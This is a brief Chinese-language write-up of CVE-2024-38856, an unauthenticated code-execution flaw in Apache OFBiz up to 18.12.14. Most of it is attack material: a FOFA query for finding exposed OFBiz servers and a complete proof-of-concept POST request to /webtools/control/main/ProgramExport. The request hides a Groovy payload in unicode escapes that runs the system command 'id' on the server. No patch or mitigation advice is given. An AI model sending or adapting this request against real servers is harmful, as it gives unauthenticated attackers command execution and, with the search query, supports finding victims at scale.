# Apache-OFBiz授权不当致代码执行漏洞(CVE-2024-38856)

2024年8月，互联网上披露了Apache OFBiz 授权不当致代码执行漏洞(CVE-2024-38856)，该漏洞允许未经身份验证的远程攻击者通过特定的URL绕过安全检测机制执行恶意代码。攻击者可能利用该漏洞来执行恶意操作，包括但不限于获取敏感信息、修改数据或执行系统命令，最终可导致服务器失陷。Apache OFBiz <= 18.12.14

## fofa

```yaml
app="Apache_OFBiz"
```

## poc

```java
POST /webtools/control/main/ProgramExport HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded
 
groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
```

![效果图](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408062344609.png)

